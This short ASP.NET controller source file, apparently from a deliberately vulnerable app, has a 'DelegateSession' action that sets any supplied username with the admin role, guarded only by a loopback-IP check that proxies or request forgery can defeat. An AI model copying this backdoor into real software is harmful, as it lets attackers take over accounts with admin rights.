using Microsoft.AspNetCore.Mvc;

namespace Loam.Controllers;

public class MaintenanceController : Controller
{
    public IActionResult ExportUsers()
    {
        return Content("disabled");
    }

    public IActionResult ResetConfig()
    {
        return Content("disabled");
    }

    public IActionResult DelegateSession(string username)
    {
        var a = HttpContext.Connection.RemoteIpAddress?.ToString();
        if (a != "127.0.0.1" && a != "::1")
            return StatusCode(403);

        HttpContext.Session.SetString("Username", username);
        HttpContext.Session.SetString("Role", "admin");
        return RedirectToAction("Index", "Home");
    }
}
